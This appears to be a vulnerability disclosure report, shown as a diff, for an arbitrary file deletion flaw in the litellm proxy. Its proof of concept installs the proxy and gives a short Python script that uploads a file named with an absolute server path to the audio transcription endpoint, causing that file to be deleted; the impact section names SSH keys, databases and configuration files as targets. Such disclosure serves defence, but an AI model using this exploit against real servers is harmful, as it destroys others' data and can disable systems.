@@ -1,7 +1,34 @@
 Title: Arbitrary file delete in berriai/litellm
 
 Proof of Concept: 
+pip3 install 'litellm[proxy]'
+litellm --model huggingface/bigcode/starcoder
+#  Uvicorn running on http://0.0.0.0:4000 (Press CTRL+C to quit)
 
+Now run the following script
+
+import requests
+
+
+def upload_file(api_key):
+
+    header = {
+        "Authorization": f"Bearer {api_key}"
+    }
+
+    files = {
+        'file': ('/IMPORTANTFILE.txt', '/IMPORTANTFILE.txt', 'text/plain'),
+    }
+
+    response = requests.post('http://localhost:4000/audio/transcriptions', files=files, headers=header)
+    print(response.text)
+
+upload_file("apikeyhere")
+
+python3 test.py
+#...
+ls -lha /
+# the file is deleted
 
 Impact: 
 Any user can delete an arbitraty file on server. We can imagine deleting ssh key, sqlite database, configuration files...
